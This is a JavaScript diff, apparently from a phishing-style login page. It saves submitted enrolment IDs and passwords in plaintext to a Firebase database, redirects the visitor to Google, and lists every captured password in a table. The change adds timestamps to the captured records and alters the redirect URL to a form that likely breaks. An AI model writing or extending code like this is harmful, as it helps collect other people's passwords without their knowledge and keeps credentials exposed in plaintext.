@@ -32,7 +32,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 const novoUsuarioRef = ref(database, 'usuarios/' + Date.now());
                 set(novoUsuarioRef, {
                     matricula: matricula,
-                    senha: senha
+                    senha: senha,
+						  data: new Date(Date.now()).toLocaleString()
                 }).then(() => {
                     document.getElementById('matricula').value = '';
                     document.getElementById('senha').value = '';
@@ -40,8 +41,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     console.error("Erro ao salvar usuário: ", error);
                 });
             }
-				console.log("AAAA");
-				window.location.href = 'https://www.google.com';
+				window.location.href = 'www.google.com';
         });
     }
 
@@ -61,6 +61,9 @@ document.addEventListener('DOMContentLoaded', function() {
 
             const cellSenha = row.insertCell(1);
             cellSenha.textContent = usuario.senha;
+				
+            const cellData = row.insertCell(2);
+            cellData.textContent = usuario.data;
         });
     });
 });
